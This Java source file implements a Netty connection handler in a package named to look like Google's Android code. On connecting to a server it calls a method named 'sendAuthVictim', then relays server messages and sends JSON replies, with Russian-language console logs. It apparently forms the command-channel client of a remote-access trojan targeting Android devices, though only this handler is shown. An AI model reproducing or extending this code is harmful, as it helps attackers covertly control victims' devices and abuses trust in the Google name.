package com.google.android.android;

import org.json.simple.JSONObject;

import java.net.SocketAddress;

import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class QueryHandler extends ChannelInboundHandlerAdapter {
    private ChannelHandlerContext ctx;

    @Override
    public void channelActive(ChannelHandlerContext ctx) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println("Успешно подключились! ("+address+")");
        this.ctx = ctx;
        NettyClient.getInstance().sendAuthVictim();
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        NettyClient.getInstance().receiveMessage(msg);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
        ctx.channel().close();
        System.out.println("Отключились от сервера!");
        cause.printStackTrace();
        // TODO: 29.05.2018 реконнект
    }

    public void sendMessage(JSONObject message) {
        if (!ctx.channel().isActive()) System.out.println("Нет соединения с сервером!");
        else {
            System.out.println("Server << " + message);
            ctx.writeAndFlush(message);
        }
    }
}
